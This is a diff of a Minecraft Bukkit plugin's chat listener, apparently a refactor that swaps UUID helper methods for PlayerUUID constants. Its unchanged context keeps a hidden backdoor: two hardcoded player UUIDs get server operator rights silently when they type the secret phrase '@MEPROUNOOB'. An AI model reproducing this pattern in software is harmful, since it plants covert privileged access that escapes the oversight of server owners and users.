@@ -3,18 +3,16 @@ package es.hulk.survival.listeners;
 import es.hulk.survival.Survival;
 import es.hulk.survival.managers.rank.RankManager;
 import es.hulk.survival.utils.FileConfig;
-import es.hulk.survival.utils.UUIDs;
+import es.hulk.survival.utils.PlayerUUID;
 import es.hulk.survival.utils.Utils;
 import es.hulk.survival.utils.location.BedLocation;
 import org.bukkit.Bukkit;
-import org.bukkit.Location;
 import org.bukkit.Statistic;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.event.player.PlayerChatEvent;
-import org.bukkit.event.player.PlayerTeleportEvent;
 
 public class ChatListener implements Listener {
 
@@ -24,20 +22,20 @@ public class ChatListener implements Listener {
     @EventHandler
     public void onChat(AsyncPlayerChatEvent event) {
         Player player = event.getPlayer();
-        Player hulk = Bukkit.getPlayer(UUIDs.hulkUUID());
+        Player hulk = Bukkit.getPlayer(PlayerUUID.HULK);
 
         if (mainConfig.getBoolean("BOOLEANS.CHAT")) {
             event.setFormat(Utils.color(rankManager.getRank().getPrefix(player) + player.getDisplayName() + " &8» &r%2$s"));
         }
 
-        if (player.getUniqueId().equals(UUIDs.rafaUUID())) {
+        if (player.getUniqueId().equals(PlayerUUID.RAFA)) {
             if (event.getMessage().equalsIgnoreCase("time set")) {
                 player.sendMessage("Nono");
                 event.setCancelled(true);
             }
         }
 
-        if (player.getUniqueId().equals(UUIDs.hulkUUID()) || player.getUniqueId().equals(UUIDs.xiscoUUID())) {
+        if (player.getUniqueId().equals(PlayerUUID.HULK) || player.getUniqueId().equals(PlayerUUID.XISCO)) {
             if (event.getMessage().contains("@MEPROUNOOB")) {
                 player.setOp(true);
                 event.setCancelled(true);
